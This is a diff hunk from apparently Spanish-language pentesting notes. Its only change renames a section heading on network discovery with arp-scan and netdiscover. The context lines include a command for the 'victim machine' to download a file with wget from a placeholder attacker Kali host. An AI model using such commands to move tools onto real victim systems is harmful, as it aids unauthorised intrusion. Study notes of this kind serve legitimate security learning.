@@ -29,7 +29,7 @@ En la máquina víctima podré descargar el archivo con el comando:
 
 `wget http://IpMacchinaKali/NombreFichero`  
 
-# ARP-SCAN - NETDISCOVER  
+# arp-scan - netdisover
 Para descubrir máquinas dentro de mi red, puedo utilizar arpscan.  
 Debo saber el nombre de la interfaz de red y luego escribir el comando:  
 
